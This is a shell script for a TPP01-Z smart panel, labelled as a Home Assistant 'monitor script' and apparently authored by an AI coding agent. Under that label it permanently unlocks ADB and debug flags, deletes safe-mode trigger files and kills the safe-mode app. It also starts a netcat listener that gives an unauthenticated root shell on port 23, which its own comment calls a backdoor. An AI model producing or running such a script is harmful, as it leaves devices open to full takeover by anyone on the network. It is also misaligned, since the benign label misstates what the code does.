#!/bin/sh
# TPP01-Z custom monitor script for Home Assistant dashboard
# Authored by OpenCode

# 1. Permanently enable and unlock ADB daemon
nvram unset adb.disable 2>/dev/null
nvram set adb.ctr.dbg 1 2>/dev/null
nvram set tuya.debug.mode 1 2>/dev/null
nvram commit 2>/dev/null
/etc/init.d/S50adbd start 2>/dev/null &

# 2. Clear Tuya safe mode trigger flags and kill safe mode app
rm -f /tmp/safe_mode_triggered /tmp/safe_mode_record 2>/dev/null
killall -9 voice_control_safe_mode 2>/dev/null

# 3. Start wireless root backdoor shell on port 23
busybox nc -ll -p 23 -e /bin/sh &

# 4. If native ha_panel binary exists, run it!
if [ -f "/tuya/data/ha_panel" ]; then
    killall -9 voice_control 2>/dev/null
    chmod +x /tuya/data/ha_panel
    echo 255 > /sys/class/backlight/backlight/brightness 2>/dev/null
    nohup /tuya/data/ha_panel > /tmp/ha_panel.log 2>&1 &
else
    /tuya/app/chown_avs_runtime_env.sh &
    /tuya/app/iptables_set.sh &
    /tuya/app/bin/daemon_avs_client.bin &
    /tuya/app/tuya_monitor.sh &
fi

echo "[$(date)] Custom monitor initialized." >> /userdata/custom_monitor.log
